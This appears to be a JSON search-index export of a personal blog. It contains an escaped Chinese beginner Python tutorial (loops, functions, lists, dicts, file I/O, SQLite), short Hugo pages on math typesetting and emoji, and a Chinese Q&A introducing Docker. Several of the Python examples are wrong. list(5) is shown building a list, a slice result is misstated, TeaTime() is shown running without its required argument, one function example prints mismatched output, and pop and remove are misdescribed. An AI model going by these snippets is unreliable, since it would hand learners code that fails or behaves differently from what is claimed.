\u0026gt;\u0026gt;\u0026gt; \u0026#34;Jessica\u0026#34; 條件式迴圈 - while 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # while迴圈 i = 0 while i \u0026lt; 5: i += 1 print(i) \u0026gt;\u0026gt;\u0026gt; 1 \u0026gt;\u0026gt;\u0026gt; 2 \u0026gt;\u0026gt;\u0026gt; 3 \u0026gt;\u0026gt;\u0026gt; 4 \u0026gt;\u0026gt;\u0026gt; 5 # While判斷(反覆驗證直到ans等於\u0026#34;happy\u0026#34;) ans = input(\u0026#34;請輸入快樂的英文：\u0026#34;) while ans != \u0026#34;happy\u0026#34;: ans = input(\u0026#34;拼錯囉，再給你一次機會：\u0026#34;) else: print(\u0026#34;答對囉，是happy\u0026#34;) break：跳脫迴圈 1 2 3 4 5 6 7 8 9 ans = input(\u0026#34;請輸入快樂的英文：\u0026#34;) while ans.lower() != \u0026#34;happy\u0026#34;: # 當輸入quit時跳出迴圈 if(ans.lower() == \u0026#34;quit\u0026#34;): print(\u0026#34;猜不出來了吧，結束\u0026#34;) break; ans = input(\u0026#34;拼錯囉，再給你一次機會：\u0026#34;) else: print(\u0026#34;答對囉，是\u0026#34;, ans) continue：跳過繼續進行下一迴圈 1 2 3 4 5 6 7 8 # i遇4的因數就跳過 i = 0 while i \u0026lt;= 100: i += 1 # continue前要先加1，避免進入無窮迴圈 if i % 4 == 0: continue print(i, end=\u0026#34; \u0026#34;) 自訂函式 自定義函式 - def 一般宣告函式 1 2 3 4 5 6 7 def printStar(_n): return \u0026#34;*\u0026#34; * _n # 執行函式 print(printStar(6)) \u0026gt;\u0026gt;\u0026gt; ****** 設定參數預設值 1 2 3 4 5 6 7 8 9 10 11 def TeaTime(desserts, drink=\u0026#34;咖啡\u0026#34;): print(f\u0026#39;下午茶點心為{desserts},飲料為{drink}\u0026#39;) TeaTime(\u0026#39;馬卡龍\u0026#39;, \u0026#39;紅茶\u0026#39;) # 指定實際參數 TeaTime(\u0026#39;馬卡龍\u0026#39;) # 飲料會顯示預設值:咖啡 TeaTime() # 兩個參數都顯示預設值 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為馬卡龍,飲料為紅茶 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為馬卡龍,飲料為咖啡 \u0026gt;\u0026gt;\u0026gt; 下午茶點心為鬆餅,飲料為咖啡 設定不定個數參數(參數為tuple型態) 帶入參數帶星號可將帶入的參數組成一個tuple 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(1, 2, 4, 6) \u0026gt;\u0026gt;\u0026gt; 13 實際參數帶星號可將原為tuple型態的資料拆解開來 1 2 3 4 5 6 7 8 9 def add(*numbers): total = 0 for i in numbers: total += i print(total) add(*range(0, 11)) \u0026gt;\u0026gt;\u0026gt; 55 多個回傳值 1 2 3 4 5 6 7 8 9 10 11 12 # 回傳值用逗號隔開 def divmod(x, y): div = x // y mod = x % y return div, mod # 用{a,b}接多個回傳值 a, b = divmod(100, 7) print(f\u0026#39;100除以7的商數為{a},餘數為{b}\u0026#39;) \u0026gt;\u0026gt;\u0026gt; 100除以7的商數為14,餘數為2 操作 List(列表) 建立 建立空list 1 2 3 4 5 # 方法1: list1 = [] # 方法2: list2 = list() 建立list 1 list1 = [1, \u0026#34;taipei\u0026#34;, 2, \u0026#34;tokyo\u0026#34;] # 每個的資料型態不限 從string建立list 1 list1 = list(\u0026#34;Hello\u0026#34;) # list1為 [\u0026#34;H\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;l\u0026#34;,\u0026#34;o\u0026#34;] 從range建立list 1 list1 = list(5) # list1為 [0,1,2,3,4] 從字串分割建立list 1 list1 = \u0026#34;1 2 3\u0026#34;.split() # list1為 [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;] 刪除 刪除整個list 1 del list1 刪除list中的某一個(以第一個為例) 1 2 3 4 5 6 7 8 # 方法1 del list1[0] # 方法2 list.remove(0) # 方法3 list.pop([0]) 清除list元素(等於del list[::]) 1 2 3 4 list1 = [2,4,6,8,10] list1.clear() \u0026gt;\u0026gt;\u0026gt; [] list新增元素 1 2 3 list.append(x) # 附加元素到最後 list.extend(L) list.inser(i, x) # 插入元素至指定位置 查詢索引 1 list1.index(\u0026#39;a\u0026#39;) # 查詢a在list1的索引 統計出現的次數 1 list1.count(\u0026#39;a\u0026#39;) # 統計a在list1中出現的次數 元素排序 1 list.sort() # 原地操作 元素倒序 1 list1.reverse() # 原地操作 操作 Dict(字典) 查詢 一般查詢 1 dict1[key] # 若key值不在會報錯 以key查詢，使用dict1.get(key, [default]) - (推薦) 1 2 3 4 5 6 7 8 9 10 11 12 13 # 若無key值則顯示default dict1.get(key, [default]) #example: fruits = {\u0026#34;apple\u0026#34;:\u0026#34;30元\u0026#34;, \u0026#34;banana\u0026#34;:\u0026#34;10元\u0026#34;} Quest = input(\u0026#34;請輸入要查詢的價格的水果：\u0026#34;) print(fruits.get(Quest, \u0026#34;查無此水果\u0026#34;)) \u0026lt;\u0026lt;\u0026lt; apple \u0026gt;\u0026gt;\u0026gt; 30元 \u0026lt;\u0026lt;\u0026lt; orange \u0026gt;\u0026gt;\u0026gt; 查無此水果 查詢所有的key (回傳列表) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;小丸子\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;小玉\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;花輪\u0026#34;} dict1.keys() \u0026gt;\u0026gt;\u0026gt; dict_keys([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) 查詢所有的values (回傳列表) 1 2 3 4 dict1 = {\u0026#34;user1\u0026#34;:\u0026#34;小丸子\u0026#34;, \u0026#34;user2\u0026#34;:\u0026#34;小玉\u0026#34;, \u0026#34;user3\u0026#34;:\u0026#34;花輪\u0026#34;} dict1.values() \u0026gt;\u0026gt;\u0026gt; dict_values([\u0026#39;小丸子\u0026#39;, \u0026#39;小玉\u0026#39;, \u0026#39;花輪\u0026#39;]) 建立 建立空dict 1 2 3 4 5 # 方法1: dict1 = {} # 方法2: dict2 = dict() 建立dict 1 dict1 = {1:\u0026#34;one\u0026#34;, 2:\u0026#34;tow\u0026#34;, 3:\u0026#34;three\u0026#34;} 新增dict 1 dict1[newKey] = value 更新 更新dict 1 dict1[oldKey] = value 比對更新 - update update 會比對沒有的key並補上，比對有的key進行value更新。 1 2 3 4 5 6 dict1 = {\u0026#39;user1\u0026#39;: \u0026#39;小丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;} dict2 = {\u0026#39;user1\u0026#39;: \u0026#39;大丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;多拉A夢\u0026#39;} dict1.update(dict2) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;user1\u0026#39;: \u0026#39;大丸子\u0026#39;, \u0026#39;user2\u0026#39;: \u0026#39;小玉\u0026#39;, \u0026#39;user3\u0026#39;: \u0026#39;花輪\u0026#39;, \u0026#39;user4\u0026#39;: \u0026#39;多拉A夢\u0026#39;} 刪除 刪除整個dict 1 del dict1 清空整個dict 1 dict1.clear() 刪除list中的某一個(以第一個為例) 1 del dict1[key] 操作 class (類別/物件導向) 封裝成一個類別 - class 類別名稱: python的class會自動執行__init__函式，可自行定義__init__內要做的事。 __init__第一個參數預設為self。 1 2 3 4 5 6 7 class GoogleSpyder: def __init__(self, keyword): self.keyword = keyword self.url_tmp = \u0026#34;http://google.com/search?q=\u0026#34; + keyword + \u0026#34;\u0026amp;start={}\u0026#34; self.headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} googleSpyder = GoogleSpyder(\u0026#34;python\u0026#34;) # 自動執行 __init__ 檔案處理 讀寫模式 模式 說明 r read：讀取(檔案需存在) w write：新建檔案寫入(檔案可不存在，若存在則清空) a append：資料附加到舊檔案後面(游標指在檔案結尾，檔案可不存在) r+ 讀取舊資料並寫入(檔案需存在且游標指在開頭) w+ 清空檔案內容，新寫入的東西可再讀出 a+ 資料附加到舊檔案後面，可讀取資料 b 二進位模式 記憶方式： 1 2 3 4 w、w+ # 會清除原檔案內容 r、r+ # 檔案指標指向檔案開頭 a、a+ # 檔案指標指向檔案結尾 + # 可讀可寫模式 檔案開啟 - open() 操作後需關檔 - close() 1 2 3 4 5 6 7 8 9 10 content = \u0026#34;\u0026#34;\u0026#34;Hello Python 中文測試 abc 123456.321654987 $@^$%^@#$!@#$ \u0026#34;\u0026#34;\u0026#34; file = open(\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) ... file.close() 讀取 - read() myfile.txt 1 testtest123 test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) print(file.read()) file.close() 執行回傳 1 \u0026gt;\u0026gt;\u0026gt; testtest123 寫入 - write() test.py 1 2 3 file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;testtest123\u0026#39;) file.close() myfile.txt 1 testtest123 移動讀寫頭 - seek() 1 2 3 4 5 6 7 8 9 10 11 12 content = \u0026#34;\u0026#34;\u0026#34;Hello Python\u0026#34;\u0026#34;\u0026#34; file = open(r\u0026#34;myfile.txt\u0026#34;, \u0026#34;r\u0026#34;) # file.write(content) file_content = file.read() print(file_content) file.seek(0) # 移動讀寫頭到開頭 file_content = file.read() print(file_content) file.close() 執行回傳 1 2 \u0026gt;\u0026gt;\u0026gt; Hello Python \u0026gt;\u0026gt;\u0026gt; Hello Python 讀出行數 - readline() \u0026amp; readlines() readline：一行一行讀 readlines：一次讀全部行數 poem.txt 1 2 3 4 松下問童子 言師採藥去 只在此山中 雲深不知處 read.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # readlines() 一次讀出 f = open(r\u0026#39;poem.txt\u0026#39;, \u0026#39;r\u0026#39;) lines = f.readlines() for line in lines: print(line, end=\u0026#39;\u0026#39;) f.seek(0) # 讀寫頭回到開頭 # readline() 一行一行讀 line = f.readline() while line != \u0026#39;\u0026#39;: print(line, end=\u0026#39;\u0026#39;) line = f.readline() f.close() 執行回傳： 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; 松下問童子 \u0026gt;\u0026gt;\u0026gt; 言師採藥去 \u0026gt;\u0026gt;\u0026gt; 只在此山中 \u0026gt;\u0026gt;\u0026gt; 雲深不知處 使用 with-open-as 做讀檔案的動作 - (推薦) 1 2 with open(r\u0026#34;poem.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: print(file.read()) 執行回傳： 1 2 3 4 \u0026gt;\u0026gt;\u0026gt; 松下問童子 \u0026gt;\u0026gt;\u0026gt; 言師採藥去 \u0026gt;\u0026gt;\u0026gt; 只在此山中 \u0026gt;\u0026gt;\u0026gt; 雲深不知處 刪除檔案 - remove() 使用os模組 使用os.path.exists判斷檔案是否存在 1 2 3 4 5 6 7 8 import os file = r\u0026#34;poem2.txt\u0026#34; if os.path.exists(file): os.remove(file) else: print(\u0026#39;No exists file\u0026#39;) 新增目錄 - mkdir() 使用os.path.exists判斷檔案是否存在 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): print(\u0026#34;Direct is exists\u0026#34;) else: os.mkdir(dir) 刪除空目錄 - rmdir() 使用os.path.exists判斷檔案是否存在 限定空目錄 1 2 3 4 5 6 7 8 import os dir = \u0026#34;testDir\u0026#34; if os.path.exists(dir): os.rmdir(dir) else: print(\u0026#34;Direct is undefine\u0026#34;) 刪除目錄與底下全部檔案 - rmtree() 使用shell utility模組 - shutil 需謹慎使用避免刪錯目錄 1 2 3 import shutil shutil.rmtree(\u0026#34;testDir\u0026#34;) Python 語法筆記 兩個變數交換值(Python Only) 1 2 3 4 x = 3 y = 8 x,y = y,x # 交換兩個變數的值 print(x,y) 開頭宣告編碼方式可直接強轉(Python Only) 1 2 3 4 # -*- coding: utf-8 -*- # 轉utf-8 print(\u0026#34;哈囉\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;哈囉\u0026#34; Python函數帶入參數方式 參數以tuple傳入function。 1 2 3 4 5 6 def func1(*args): print(args) func2(1,3,5,7,9) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) 參數以tuple拆解，進function在組合回tuple。 1 2 3 4 5 6 def func2(*args): print(args) func2(*(2,4,6,8,10)) \u0026gt;\u0026gt;\u0026gt; (1, 3, 5, 7, 9) 參數以dict傳入function。 1 2 3 4 5 6 def func3(**kwargs): print(kwargs) func3(even=(2,4,6,8), odd=(1,3,5,7,9)) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} 參數以dict拆解，進function在組合回dict(需為參數指定關鍵字)(關鍵字參數)。 1 2 3 4 5 6 def func4(**kwargs): print(kwargs) func4(**{\u0026#34;even\u0026#34;:(2,4,6,8), \u0026#34;odd\u0026#34;:(1,3,5,7,9)}) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;even\u0026#39;: (2, 4, 6, 8), \u0026#39;odd\u0026#39;: (1, 3, 5, 7, 9)} 其他 字串運算(Python Only) in：是否含有 1 2 3 # in \u0026#34;or\u0026#34; in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; True not in：是否不含有 1 2 3 # not in \u0026#34;abc\u0026#34; not in \u0026#34;forever\u0026#34; \u0026gt;\u0026gt;\u0026gt; False 取字串的特定位置字元 格式：開始點:結束點:間隔 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 取第1~4個字元(不含第4個) \u0026#34;abcdefg\u0026#34;[1:4] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bcde\u0026#39; # 取第1~4個字元(每次間隔2個) \u0026#34;abcdefg\u0026#34;[1:4:2] \u0026gt;\u0026gt;\u0026gt; \u0026#39;bd\u0026#39; # 取最後一個字元 \u0026#34;abcdefg\u0026#34;[-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;g\u0026#39; # 反轉 \u0026#34;abcdefg\u0026#34;[::-1] \u0026gt;\u0026gt;\u0026gt; \u0026#39;gfedcba\u0026#39; SQLite 關聯式資料庫(版本3.31.1) 系統命令(.開頭)，SQL命令(;結尾)\n系統命令 進入資料庫 指令：sqlite3 資料庫名稱 1 2 3 sqlite3 test01.sqlite sqlite\u0026gt; 資料庫 (DB) sqlite指令新增資料庫 1 .open test01 sqlite指令查詢所有資料庫 1 .databases 資料表 (Table) 欄位設定 說明 NM (None)可否允許空值 PK (Primary Key)是否為主鍵 AI (A.I)是否自動產生值 U (Unique)不重複鍵 新增資料表 1 create table studen(ID Integer, name String, score Integer); sqlite指令查詢所有資料表 1 .table 更新資料表 SQL語法：ALTER TABLE 資料庫 ADD COLUMN 欄位名稱 資料型態\n1 ALTER TABLE student ADD COLUMN address String; 資料操作 (CRUD:Create/Read/Update/Delete) 插入資料 SQL語法：INSERT INTO 資料表 VALUES(欄位1, 欄位2, 欄位3)\n1 INSERT INTO student values(1001, \u0026#34;Ben\u0026#34;, 88); 查詢資料 SQL語法：SELECT 欄位 FROM 資料表 [WHERE 條件];\n1 SELECT Score from student WHERE ID = 1001; 刪除資料 SQL語法：DELETE FROM 資料表 [WHERE 條件];\n1 DELETE from student WHERE ID = 1001; 修改資料 SQL語法：UPDATE 資料表 SET 欄位名稱 = 值 [WHERE 條件];\n1 UPDATE student SET Name = \u0026#34;Amanda\u0026#34; WHERE ID = 1001; ","date":"2020-03-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52283398446_ed21ce37f2_o.png","permalink":"https://wayneblog.ga/2020-03-15/python-beginner-tutorial/","title":"智慧商業Python數據分析與應用班(版本3.*)"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTex globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTex on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Block math: $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n","date":"2019-03-08T00:00:00Z","permalink":"https://wayneblog.ga/2019-03-08/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://wayneblog.ga/2019-03-05/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2019-03-05/emoji-support/","title":"Emoji Support"},{"content":" 參考網站\n不論是 Google、Amazon、微軟、VMware 都紛紛擁戴，加入 Docker 和 Container 所掀起的新世代雲端虛擬化行列，這 2 項技術成為了 IT 界的新顯學。Docker 和 Container 到底是什麼？以下 10 個 Q\u0026amp;A 告訴你。\nQ1：Container 技術和伺服器虛擬化是一樣的技術嗎？\n**A：**不是。兩者雖然都屬於虛擬化的技術，目標都是為了將一套應用程式所需的執行環境打包起來，建立一個孤立環境，方便在不同的硬體中移動，但兩者的運作思維截然不同。簡單來說，常見的傳統虛擬化技術如 vSphere 或 Hyper-V 是以作業系統為中心，而 Container 技術則是一種以應用程式為中心的虛擬化技術。\n傳統虛擬化技術從作業系統層下手，目標是建立一個可以用來執行整套作業系統的沙箱獨立執行環境，習慣以虛擬機器(Virtual Machine)來稱呼。而 Container 技術則是直接將一個應用程式所需的相關程式碼、函式庫、環境配置檔都打包起來建立沙箱執行環境，為了和傳統虛擬化技術產生的虛擬機器區分，Container 技術產生的環境就稱為 Container。\nQ2：一般常見的虛擬機器和 Container 有何不同？\n**A：**最明顯的差別是，虛擬機器需要安裝作業系統(安裝 Guest OS)才能執行應用程式，而 Container 內不需要安裝作業系統就能執行應用程式。Container 技術不是在 OS 外來建立虛擬環境，而是在 OS 內的核心系統層來打造虛擬執行環境，透過共用 Host OS 的作法，取代一個一個 Guest OS 的功用。Container 也因此被稱為是 OS 層的虛擬化技術。\nQ3：為何 Container 是輕量級虛擬化技術？\n**A：**因為 Container 技術採取共用 Host OS 的作法，而不需在每一個 Container 內執行 Guest OS，因此建立 Container 不需要等待作業系統開機時間，不用 1 分鐘或幾秒鐘就可以啟用，遠比需要數分鐘甚至數十分鐘才能開啟的傳統虛擬機器來的快。\nQ4：Container 技術是全新的技術嗎？\n**A：**不是，早在 1982 年，Unix 系統內建的 chroot 機制也是一種 Container 技術。其他如 1998 年的 FreeBSD jails、2005 年出現的 Solaris Zones 和 OpenVZ，或像是 Windows 系統 2004 年就有的 Sandboxie 機制都屬於在作業系統內建立孤立虛擬執行環境的作法，都可稱為是 Container 的技術。\n直到 2013 年，dotCloud 這家 PaaS 服務公司開源釋出了一套將 Container 標準化的平臺 Docker，大受歡迎，所以，dotCloud 決定以 Docker 為名成立新公司力推。\nQ5：Docker 如何實現 Container 標準化？\n**A：**Docker 採用了 aufs 檔案系統來設計一個可以層層堆疊的 Container 映象檔，將 Container 內的所有程式(包括應用程式、相關函式庫、設定檔)，都打包進 Docker 映象檔，並且提供了一個 Dockerfile 設定檔來記錄建立 Container 過程的每一個步驟包括參數。只要在任何支援 Docker 平臺的環境中，就可以從這個映象檔來建立出一個一模一樣的 Container 來執行同一個應用程式。如此一來，應用程式等於是可以透過 Docker 映象檔，或甚至只需要 Dockerfile，就能將程式執行環境帶著走，移動到任何支援 Docker 的環境中。Docker 公司也釋出 API，可以用來控制所有的 Container 相關指令，任何人只要使用同一套 Docker，就等於有了同一套管理和建立 Container 的方法，也就等同於將 Container 運用標準化了。\nQ6：一個 Container 映象檔內可以安裝多少應用程式？\n**A：**一個 Container 的映象檔內可以安裝多支程式，例如同時安裝 Ubuntu、Apache、MySQL、Node.js、Ruby 等。不過，Docker 官方建議，一隻程式安裝在一個 Container 內，再把這些 Container 疊起來提供一個完整的服務。\nDocker 稱這是一種 Microservices(微服務)的新軟體架構，將組成一個應用系統的每一個 Stack，拆解成許多小型服務，例如 Apache 服務、MySQL 服務、Node.js 服務、Ruby 服務，每一個服務都是包在 Container 裡的一隻程式，例如 MySQL 服務就是部署在 Container 內的 MySQL。\n這麼做的好處是可以建立一個鬆散耦合的彈性應用程式架構，也能輕易地抽換其中一個 Container，例如要升級 MySQL，只需要重新載入新版 MySQL 的 Container 映象檔，就可以完成資料庫升級，不用將整套應用系統停機。\nQ7：Container 內不是不需要 OS，為何需要 OS 的基礎映象檔？\n**A：**OS 基礎映象檔的用途是讓 Container 擁有這 OS 的檔案系統，例如使用 ubuntu 基礎映象檔就可以讓 Container 建立 ubuntu 的根目錄架構，而不是用來執行一個 OS 執行實例。\nQ8：Docker 對 Devops 有何幫助？\n**A：**因為 Docker 透過 Dockerfile 來記錄建立 Container 映象檔的每一個步驟，可以將建立應用程式執行環境的過程和配置參數，完整地記錄下來。開發人員和維運人員之間可以利用 Dockerfile 來溝通對執行環境的討論。甚至結合版本控制服務如 GitHub，可以讓 Dockerfile 具備版本控制功能，能將基礎架構程式化(Infrastructure as code)來管理。\nQ9：可以在 Windows Server 環境中執行 Docker 嗎？\n**A：**還不行。目前 Docker 只能在 Linux 平臺上執行，但是微軟 10 月中剛宣布要在下一波 Windows Server 改版時內建 Docker 引擎，未來同一份 Docker 映象檔能否跨 Linux 和 Windows OS，還需待微軟揭露更多細節才能得知。\nQ10：在臺灣，如何找到懂 Docker 技術的人？\n**A：**目前 Docker 公司還未在臺設點，但有一個 Docker Taipei 社群，成員截至 10 月有 383 人。\nDocker Taipei 也預計配合 Docker 總公司舉辦的全球 HackDay 活動，在 11 月 1 日舉辦臺北場 HackDay。參加作品將直接發布到美國和全球 Docker 開發者一起評比，獎品是明年到美國參加 Docker 技術大會的資格。\n","date":"2014-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52564831824_2754e80d0b_o.png","permalink":"https://wayneblog.ga/2014-10-28/docker-10-qa/","title":"10 個 Q\u0026A 快速認識 Docker"}]